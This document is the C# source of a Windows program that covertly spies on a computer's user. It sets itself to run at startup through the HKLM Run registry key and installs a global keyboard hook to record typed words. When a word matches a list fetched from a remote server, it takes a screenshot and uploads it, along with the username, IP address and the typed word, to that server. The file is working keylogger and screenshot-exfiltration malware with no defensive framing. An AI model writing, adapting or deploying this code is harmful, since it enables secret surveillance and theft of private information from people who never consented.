using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

using System.Diagnostics;
using System.Runtime.InteropServices;

using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Net.Sockets;
using System.Collections.Specialized;
using System.IO;
using WebUtils;
using Microsoft.Win32;

using engine;

namespace keystroke
{
    static class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string word = "";
        private static List<string> spy_list = new List<string>();

        private static string SERVER_ADDRESS = "";

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            String thisprocessname = Process.GetCurrentProcess().ProcessName;

            if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
                return;


            try
            {
                RegistryKey read = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
                object currentValue = read.GetValue("ScreenLog");

                string val = "";
                if( currentValue != null )
                    val = currentValue.ToString();
                string exe_path = Application.ExecutablePath;
                if (currentValue == null || val != exe_path)
                {
                    RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    add.SetValue("ScreenLog", Application.ExecutablePath);
                }

                //if (currentValue == null || String.Compare(val, Application.ExecutablePath, true) != 0)
                //{
                //    RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                //    add.SetValue("ScreenLog", Application.ExecutablePath);
                //}
                //else
                //    MessageBox.Show("You are welcome");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Please run as administrator");
                return;
            }

            //MessageBox.Show("You are welcome1");

            readConfigFile();
            //MessageBox.Show("You are welcome2");
            getWordList();
            //MessageBox.Show("You are welcome3");

            _hookID = SetHook(_proc);
            //MessageBox.Show("You are welcome4");

            //Application.EnableVisualStyles();
            //MessageBox.Show("You are welcome5");
            //Application.SetCompatibleTextRenderingDefault(false);
            //MessageBox.Show("You are welcome6");            
            //Application.Run(new Form1());
            Application.Run();
            //UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static void readConfigFile()
        {
            String exe_path = Application.ExecutablePath;
            String dir_path = Path.GetDirectoryName(exe_path);
            String config_path = dir_path + "\\" + "config.txt";
            //MessageBox.Show(config_path);
            StreamReader fs = new StreamReader(config_path);

            string config = fs.ReadLine();
            SERVER_ADDRESS = config.Replace("Server_Address=", "").Trim();

            Console.WriteLine(SERVER_ADDRESS);

            fs.Close();
        }

        private static void getWordList()
        {
            string url = "http://" + SERVER_ADDRESS + "/restapi.php?action=wordlist";
            string result = WebHttpUtils.getResponse(url, "", "");
            if (string.IsNullOrEmpty(result))
            {
                return;
            }

            string[] list = result.Split(',');
            for (int i = 0; i < list.Count(); i++)
            {
                spy_list.Add(list[i]);
            }
        }

        private static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        private static string takeScreenshot()
        {
            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;

            return Engine.takeScreenshot(screenWidth, screenHeight);
        }

        private static void uploadImage(string path, string username, string ipaddr, string word)
        {
            try
            {
                WebClient client = new WebClient();
                string myFile = path;
                client.Credentials = CredentialCache.DefaultCredentials;

                NameValueCollection parameters = new NameValueCollection();
                parameters.Add("username", username);
                parameters.Add("ipaddr", ipaddr);
                parameters.Add("word", word);
                client.QueryString = parameters;

                client.UploadFile(@"http://" + SERVER_ADDRESS + "/upload.php", "POST", myFile);
                client.Dispose();
            }
            catch (Exception err)
            {
                MessageBox.Show(err.Message);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);

                if (vkCode == 13 || vkCode == 9 || vkCode == 32)
                {
                    bool exist = false;

                    for (int i = 0; i < spy_list.Count; i++)
                    {
                        if (word.ToLower().Contains(spy_list[i].ToLower()))
                        {
                            exist = true;
                            break;
                        }
                    }

                    if (exist == true)
                    {
                        string path = takeScreenshot();
                        string urName = System.Environment.UserName;
                        string ipAddr = GetLocalIPAddress();
                        uploadImage(path, urName, ipAddr, word);
                    }

                    word = "";
                }
                else
                {
                    if (vkCode == 46)
                    {
                    }
                    else if (vkCode == 8)
                    {
                        if (word.Length > 0)
                            word = word.Substring(0, word.Length - 1);
                    }
                    else
                    {
                        char character = (char)vkCode;
                        word += character.ToString();
                    }

                    Console.WriteLine(word);
                }


            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
